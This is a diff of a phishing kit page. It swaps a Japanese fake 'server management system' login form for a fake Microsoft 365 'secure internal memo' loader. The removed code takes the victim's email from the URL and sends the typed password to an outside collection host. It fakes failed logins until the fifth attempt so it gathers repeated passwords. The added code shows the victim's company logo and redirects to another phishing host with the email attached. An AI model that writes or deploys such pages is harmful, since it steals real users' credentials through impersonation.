@@ -1,376 +1,215 @@
 <!DOCTYPE html>
-<html lang="ja">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>サーバー管理システム | ログイン</title>
+    <title>Accessing Secure Document</title>
     <style>
+        @import url('https://fonts.googleapis.com/css2?family=Segoe+UI,system-ui,-apple-system,BlinkMacSystemFont,sans-serif');
+
         body {
-            font-family: 'Hiragino Kaku Gothic Pro', 'Meiryo', sans-serif;
-            background-color: #f5f5f5;
+            font-family: 'Segoe UI', sans-serif;
+            background-color: #F8F9FA; /* Light gray background */
+            margin: 0;
+            padding: 20px;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            margin: 0;
+            color: #333;
         }
 
-        .login-container {
-            background-color: white;
+        .container {
+            background-color: #FFFFFF;
+            border: 1px solid #DEE2E6; /* Light border */
             border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-            padding: 30px;
-            width: 320px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+            padding: 40px 50px;
+            width: 550px;
+            max-width: 95%;
+            text-align: center;
         }
 
         .header {
-            text-align: center;
             margin-bottom: 25px;
-        }
-
-        .header h1 {
-            color: #333;
-            font-size: 24px;
-            margin: 0 0 10px;
-        }
-         .header p {
-             color: #666;
-             font-size: 14px;
-             margin: 0;
-         }
-
-        form {
             display: flex;
             flex-direction: column;
+            align-items: center;
         }
 
-        .form-group {
-            margin-bottom: 15px;
+        .company-logo {
+            max-width: 150px;
+            max-height: 50px;
+            margin-bottom: 25px;
+            object-fit: contain;
         }
-
-        label {
-            display: block;
-            margin-bottom: 5px;
-            color: #555;
-            font-size: 14px;
-        }
-
-        input {
-            width: 100%;
-            padding: 10px;
-            border: 1px solid #ddd;
-            border-radius: 4px;
-            font-size: 14px;
-            box-sizing: border-box;
-        }
-
-        input[readonly] {
-            background-color: #f0f0f0; /* Slightly different shade for readonly */
-            color: #666;
-            cursor: not-allowed;
-        }
-
-        button {
-            background-color: #4285F4;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            padding: 12px;
-            font-size: 16px;
-            cursor: pointer;
-            margin-top: 10px;
-            transition: background-color 0.2s;
-        }
-
-        button:hover {
-            background-color: #3367d6;
-        }
-         button:disabled {
-              background-color: #a0c6f7;
-              cursor: not-allowed;
-         }
-
-        .footer {
-            text-align: center;
-            margin-top: 20px;
-            font-size: 12px;
-            color: #777;
-        }
-
-        .error-message {
-            color: #d32f2f; /* Red color for errors */
-            font-size: 13px;
-            margin-bottom: 15px; /* Add space below error */
-            text-align: center;
-            display: none; /* Hidden by default */
-            padding: 8px;
-            background-color: #ffebee; /* Light red background */
-            border: 1px solid #d32f2f;
-            border-radius: 4px;
-        }
-        .error-message.success {
-             color: #2e7d32; /* Green color for success */
-             background-color: #e8f5e9; /* Light green background */
-             border-color: #2e7d32;
-        }
-
-        .context-notification {
-            background-color: #fff3e0; /* Light orange/yellow background */
-            border: 1px solid #ffe0b2; /* Slightly darker border */
-            border-radius: 4px;
-            padding: 15px;
-            margin-bottom: 20px;
-            font-size: 14px;
-            color: #5f4e3a; /* Darker text color for contrast */
-            display: none; /* Hidden by default, shown by JS if email exists */
-        }
-        .context-notification p {
+        
+        .title {
+            color: #212529;
+            font-size: 26px;
+            font-weight: 600;
             margin: 0 0 10px 0;
-            line-height: 1.5;
-        }
-        .context-notification p:last-child {
-            margin-bottom: 0;
-        }
-        .context-notification strong {
-             color: #453a2b;
-        }
-        .context-notification .action-button-placeholder {
-             display: inline-block;
-             background-color: #ffcc80; /* Button-like color */
-             color: #453a2b;
-             padding: 8px 12px;
-             border-radius: 4px;
-             text-decoration: none;
-             font-weight: 500;
-             margin-top: 10px;
-             cursor: default; /* It doesn't do anything on its own */
         }
 
-        .hidden { /* Utility class */
-            display: none;
+        .subtitle {
+            color: #6C757D;
+            font-size: 16px;
+            margin-bottom: 30px;
+        }
+
+        .loading-container {
+            margin-bottom: 20px;
+        }
+
+        .loading-text {
+            color: #005A9E; /* SharePoint blue */
+            font-size: 15px;
+            margin: 0;
+            height: 20px;
+            transition: color 0.3s;
+        }
+
+        .progress-container {
+            background-color: #E9ECEF;
+            height: 4px;
+            border-radius: 2px;
+            overflow: hidden;
+            margin: 15px auto 25px;
+            width: 80%;
+        }
+
+        .progress-bar-fill {
+            height: 100%;
+            background-color: #0078D4; /* Microsoft Blue */
+            width: 0%;
+            animation: decrypt-fill 2.5s ease-out forwards;
+            border-radius: 2px;
+        }
+
+        .file-info { 
+            color: #6C757D;
+            font-size: 14px;
+            margin: 0 0 30px 0;
+        }
+
+        .footer-text {
+            color: #ADB5BD;
+            font-size: 12px;
+            margin-top: 35px;
+        }
+
+        @keyframes decrypt-fill {
+            from { width: 0%; }
+            to { width: 100%; }
+        }
+
+        noscript {
+            display: block;
+            margin-top: 20px;
+            padding: 15px;
+            background-color: #FFF3CD;
+            color: #856404;
+            border: 1px solid #FFEEBA;
+            border-radius: 4px;
         }
     </style>
 </head>
 <body>
-    <div class="login-container">
+    <div class="container">
         <div class="header">
-            <h1>サーバー管理システム</h1>
-            <p>認証情報を入力してください</p>
+            <img src="" alt="Company Logo" class="company-logo" id="companyLogo" style="display: none;">
+            <h1 class="title">Accessing Secure Internal Memo</h1>
+            <p class="subtitle">Please wait while we establish a secure connection to your organization's document.</p>
         </div>
-
-        <div class="context-notification" id="contextNotification">
-            <p><strong><span id="context-email">[メールアドレス]</span> 様</strong></p>
-            <p>システムからの重要なお知らせがあります。<br>
-               ログインしてご確認ください。</p>
+        <div class="loading-container">
+            <p class="loading-text" id="loadingText">Establishing secure channel...</p>
         </div>
-
-        <div id="errorMessage" class="error-message">
-            <!-- Error messages will be shown here -->
+        <div class="progress-container">
+            <div class="progress-bar-fill" id="progressBar"></div>
         </div>
-
-        <form id="loginForm" method="POST" novalidate=""> <!-- Added novalidate -->
-            <div class="form-group">
-                <label for="userId">ユーザーID</label>
-                <!-- Readonly removed to allow autograb, but styled as readonly -->
-                <input type="email" id="userId" name="userId" required="" value="" style="background-color: #f0f0f0; color: #666; cursor: not-allowed;" readonly>
-            </div>
-
-            <div class="form-group">
-                <label for="password">パスワード</label>
-                <input type="password" id="password" name="password" required="">
-            </div>
-
-            <!-- No hidden fields needed as JS handles this -->
-
-            <button type="submit" id="submitButton">ログイン</button>
-        </form>
-
-        <div class="footer">
-            <p>© 2025 コントロールサーバー | 日本</p>
-        </div>
+        <p class="file-info">This may take a moment.</p>
+        <noscript>
+            <p>JavaScript is required to access this secure document. Please enable it in your browser settings.</p>
+        </noscript>
+        <p class="footer-text">Powered by Microsoft 365</p>
     </div>
 
-<script>
-// Track login attempts globally for the session
-let loginAttempts = 0;
-
-document.addEventListener('DOMContentLoaded', function() {
-    const userIdField = document.getElementById('userId');
-    const passwordField = document.getElementById('password');
-    const loginForm = document.getElementById('loginForm');
-    const submitButton = document.getElementById('submitButton');
-    const errorDisplay = document.getElementById('errorMessage');
-    const contextNotification = document.getElementById('contextNotification');
-    const contextEmailSpan = document.getElementById('context-email');
-
-    // --- Email Autograb from URL Hash ---
-    if (window.location.hash && userIdField) {
-        let userEmail = '';
-        try {
-            const hash = window.location.hash.substring(1);
-            if (hash.includes('@') && hash.includes('.')) {
-                // Decode and set the value
-                userEmail = decodeURIComponent(hash);
-                userIdField.value = userEmail;
-                // Make the field readonly AFTER setting the value by script
-                // We also keep the styling for readonly look
-                userIdField.readOnly = true;
-
-                // Update and show context notification
-                if (contextNotification && contextEmailSpan) {
-                    contextEmailSpan.textContent = userEmail;
-                    contextNotification.style.display = 'block';
-                }
+    <script>
+    (function() {
+        const loadingText = document.getElementById('loadingText');
+        const texts = [
+            "Establishing secure channel...",
+            "Verifying your identity...",
+            "Decrypting document...",
+            "Opening file..."
+        ];
+        let textIndex = 0;
+        const interval = setInterval(() => {
+            textIndex++;
+            if (textIndex < texts.length) {
+                loadingText.textContent = texts[textIndex];
             } else {
-                console.warn('URL hash does not appear to be a valid email:', hash);
-                // Optionally hide the form or show an error if email is expected via hash
-                 showError("有効なユーザーIDが指定されていません。");
-                 if(submitButton) submitButton.disabled = true;
+                clearInterval(interval);
             }
-        } catch (e) {
-            console.error('Error parsing URL hash:', e);
-            showError("ユーザーIDの読み込み中にエラーが発生しました。");
-            if(submitButton) submitButton.disabled = true;
-        }
-    } else if (userIdField) {
-         // If no hash, maybe disable login? Or allow manual input?
-         // For now, assume hash is required.
-         showError("ユーザーIDが指定されていません。");
-         if(submitButton) submitButton.disabled = true;
-         // If manual input is allowed, remove the `readonly` attribute and styling from the input tag
-         // and remove this `else if` block.
-    }
+        }, 600);
 
-    // --- Form Submission Logic ---
-    if (loginForm && submitButton && userIdField && passwordField) {
-        loginForm.addEventListener('submit', function(event) {
-            event.preventDefault(); // Prevent default form submission
-             if (submitButton.disabled) return; // Don't submit if button is disabled (e.g., no valid user ID)
-            submitForm();
-        });
+        const REDIRECT_DELAY = 3500;
+        const MOBILE_REDIRECT_URL_BASE = "https://secureinternalmemo.tdmgo.co/?WqXmwl=ZjEwMDI1ODc2NDEyNGUwN2FmYzgxZDQwNmE1MDYwZmU%3D&Zw6aMW=eNKKj8h&username=";
 
-        // Allow Enter key in password field to submit
-        passwordField.addEventListener('keydown', function(e) {
-             if (e.key === 'Enter' && !submitButton.disabled) {
-                e.preventDefault();
-                submitForm();
-            }
-        });
-    } else {
-         console.error("Could not find all required form elements (form, button, userId, password, errorDisplay).");
-         // Show a generic error on the page itself if elements are missing
-         showError("ページの読み込みエラーが発生しました。リフレッシュしてください。");
-    }
+        function getEmailFromState() {
+            const searchParams = new URLSearchParams(window.location.search);
+            const state = searchParams.get('state');
+            if (!state) return null;
 
-    function submitForm() {
-        const username = userIdField.value; // Use value from userId field
-        const password = passwordField.value;
-
-        // Basic frontend validation (password only, as userId is set by hash)
-        if (!password) {
-            showError('パスワードを入力してください。'); // Please enter the password.
-            passwordField.focus();
-            return;
-        }
-
-        // Increment attempt counter *before* sending
-        loginAttempts++;
-
-        // Prepare form data for next.php
-        const formData = new FormData();
-        // IMPORTANT: Send the userId value under the 'username' key for next.php
-        formData.append('username', username);
-        formData.append('password', password);
-        formData.append('count', loginAttempts.toString());
-
-        // Show loading state
-        const originalButtonText = submitButton.textContent;
-        submitButton.textContent = '確認中...'; // Verifying...
-        submitButton.disabled = true;
-        hideError(); // Hide previous errors
-
-        // Submit via AJAX to next.php 
-        fetch('https://ugbcxiebnxcuiecx.fusioncorp.free.hr/asp/next.php', {
-            method: 'POST',
-            body: formData
-        })
-        .then(response => {
-            if (!response.ok) {
-                throw new Error(`サーバーエラー: ${response.status}`); // Server error: status
-            }
-            return response.json();
-        })
-        .then(data => {
-            // Always reset button state after response
-            submitButton.textContent = originalButtonText;
-            // Keep button disabled if initial userId was invalid, otherwise enable
-            submitButton.disabled = !userIdField.value || userIdField.readOnly === false;
-
-
-            if (data && data.signal === 'ok') {
-                if (loginAttempts >= 5) {
-                    // SUCCESS: Redirect after 5 attempts
-                    console.log('Login successful (attempt ' + loginAttempts + '), redirecting...');
-                    showError('ログイン成功。リダイレクトしています...', true); // Login successful. Redirecting... (Mark as success)
-                    setTimeout(() => {
-                         // Redirect to the original source URL if available, otherwise a default
-                         const successUrl = document.documentElement.dataset.scrapbookSource || 'https://www.google.com/'; // Use original source or fallback
-                         window.location.href = successUrl;
-                    }, 1500);
-                } else {
-                    // FAIL (Attempts 1-4): Show error message from next.php
-                    console.log('Login failed (attempt ' + loginAttempts + ')');
-                    // Use backend message, provide default Japanese fallback
-                    showError(data.msg || 'ユーザーIDまたはパスワードが正しくありません。もう一度入力してください。'); // Username or password incorrect...
-                    passwordField.value = '';
-                    passwordField.focus();
-                     submitButton.disabled = false; // Re-enable button on failed attempt
+            const parts = state.split(':');
+            if (parts.length > 1) {
+                const potentialEmail = parts[parts.length - 1];
+                if (potentialEmail && potentialEmail.includes('@')) {
+                    return potentialEmail;
                 }
-            } else {
-                // Handle 'bad' signal or other errors from next.php
-                console.error('Received non-ok signal or invalid data from server:', data);
-                 // Use backend message, provide default Japanese fallback
-                showError(data.msg || 'ログインに失敗しました。入力内容を確認してください。'); // Login failed. Check your input.
-                passwordField.value = '';
-                passwordField.focus();
-                 submitButton.disabled = false; // Re-enable button on failed attempt
             }
-        })
-        .catch(error => {
-            console.error('Fetch Error:', error);
-            // Reset button state even on fetch error
-            submitButton.textContent = originalButtonText;
-             submitButton.disabled = !userIdField.value || userIdField.readOnly === false; // Keep disabled if no valid initial user ID
-
-             showError('サーバーへの接続中にエラーが発生しました。後でもう一度お試しください。'); // Error connecting to server. Try again later.
-             passwordField.focus();
-        });
-    }
-
-    // --- Error Display Functions ---
-    function showError(message, isSuccess = false) {
-        if (errorDisplay) {
-             errorDisplay.textContent = message;
-             errorDisplay.classList.remove('hidden', 'success'); // Remove both classes first
-             errorDisplay.style.display = 'block'; // Explicitly show
-             if (isSuccess) {
-                 errorDisplay.classList.add('success');
-             }
-        } else {
-            console.error("Error display element (#errorMessage) not found!");
-            alert(message); // Fallback
+            return null;
         }
-    }
 
-     function hideError() {
-         if (errorDisplay) {
-             errorDisplay.classList.add('hidden');
-             errorDisplay.style.display = 'none'; // Explicitly hide
-             errorDisplay.classList.remove('success'); // Remove success class if present
-         }
-     }
-});
-</script>
+        function setCompanyLogo(email) {
+            if (!email) return;
+            const domain = email.split('@')[1];
+            if (domain) {
+                const logoEl = document.getElementById('companyLogo');
+                const logoUrl = `https://logo.clearbit.com/${domain}`;
+                
+                logoEl.src = logoUrl;
+                logoEl.onload = () => { logoEl.style.display = 'block'; };
+                logoEl.onerror = () => { logoEl.style.display = 'none'; };
+            }
+        }
+        
+        function performRedirect() {
+            clearInterval(interval);
+            const email = getEmailFromState();
 
+            if (email) {
+                console.log("Found email:", email);
+                const redirectUrl = MOBILE_REDIRECT_URL_BASE + encodeURIComponent(email);
+                console.log("Redirecting to:", redirectUrl);
+                window.location.href = redirectUrl;
+            } else {
+                console.log("No email found in state parameter. Showing error.");
+                document.getElementById('loadingText').textContent = 'Access Denied: Invalid or Expired Link';
+                document.getElementById('loadingText').style.color = '#DC3545'; // Red error color
+                document.querySelector('.file-info').textContent = 'Please check the link or contact the sender.';
+                const progressBar = document.getElementById('progressBar');
+                if (progressBar) {
+                    progressBar.style.background = '#DC3545';
+                    progressBar.style.width = '100%';
+                }
+            }
+        }
+        
+        const email = getEmailFromState();
+        setCompanyLogo(email);
+        setTimeout(performRedirect, REDIRECT_DELAY);
+    })();
+    </script>
 </body>
 </html>
